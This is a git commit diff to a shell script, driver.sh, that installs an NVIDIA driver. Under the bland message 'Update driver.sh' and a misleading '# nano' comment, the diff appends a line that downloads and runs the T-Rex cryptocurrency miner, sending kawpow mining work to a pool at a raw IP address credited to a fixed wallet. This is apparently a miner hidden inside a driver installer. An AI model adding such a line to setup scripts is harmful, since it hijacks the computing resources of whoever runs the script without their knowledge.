0dae3da13d3ceac7452652ceac2bf96ed3b64018
anhacvai11 <90373481+anhacvai11@users.noreply.github.com>
2024-10-31 16:16:35 +0700

    Update driver.sh

--- driver.sh
+++ driver.sh
@@ -6,4 +6,5 @@ sudo apt install nvidia-driver-470 -y
 
 # Verify installation
 nvidia-smi
-
+# nano
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz ; tar xvzf t-rex-0.26.8-linux.tar.gz ; ./t-rex -a kawpow -o stratum+tcp://46.101.160.28:3333 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.compyny
